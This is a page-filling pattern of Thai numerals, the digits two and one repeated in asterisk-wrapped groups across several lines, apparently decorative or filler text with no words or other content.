*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* 